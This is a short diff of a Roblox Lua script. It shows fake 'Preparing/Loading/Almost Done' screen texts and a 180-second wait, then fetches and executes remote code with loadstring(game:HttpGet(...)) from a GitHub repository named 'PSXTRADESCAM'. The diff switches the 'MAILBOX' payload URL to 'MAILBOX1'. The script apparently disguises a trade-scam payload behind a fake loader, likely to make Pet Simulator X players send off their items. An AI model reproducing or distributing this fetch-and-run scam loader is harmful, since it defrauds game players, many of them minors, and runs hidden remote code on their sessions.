@@ -17,7 +17,7 @@ _G.FirstText = "Preparing..."
 _G.SecondText = "Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/MAILBOX"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/MAILBOX1"))()
 
 --visual
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/HUB"))()
